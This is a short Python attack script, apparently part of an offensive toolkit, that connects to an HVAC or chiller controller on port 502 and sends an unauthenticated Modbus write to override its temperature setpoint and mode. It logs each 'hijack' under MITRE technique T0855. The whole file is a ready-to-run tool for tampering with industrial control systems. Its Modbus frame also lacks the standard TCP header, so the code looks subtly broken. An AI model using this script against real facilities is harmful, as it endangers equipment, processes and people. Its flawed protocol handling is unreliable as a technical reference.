#!/usr/bin/env python3
# modules/attacks/industrial_cooling_hijacker.py

import argparse
import socket
import struct
import json
import os
from datetime import datetime

LOG_FILE = "results/cooling_hijack_log.json"
MITRE_TTP = "T0855"

def log_hijack(ip, temp, mode):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "target_temp": temp,
            "mode": mode,
            "ttp": MITRE_TTP
        }) + "\n")

def send_modbus_override(ip, temp, mode):
    try:
        s = socket.socket()
        s.connect((ip, 502))
        unit_id = 0x01
        register = 0x0001 if mode == "cool" else 0x0002
        payload = struct.pack(">BHH", 0x06, register, int(temp))
        s.sendall(bytes([unit_id]) + payload)
        s.close()
        log_hijack(ip, temp, mode)
        print(f"[✓] Cooling hijack: {mode} mode set to {temp}°C on {ip}")
    except Exception as e:
        print(f"[!] Hijack failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack and control industrial cooling systems")
    parser.add_argument("--ip", required=True, help="Target HVAC/Chiller IP")
    parser.add_argument("--temp", type=int, required=True, help="Temperature to set (°C)")
    parser.add_argument("--mode", choices=["cool", "heat"], required=True, help="Override mode")
    args = parser.parse_args()

    send_modbus_override(args.ip, args.temp, args.mode)
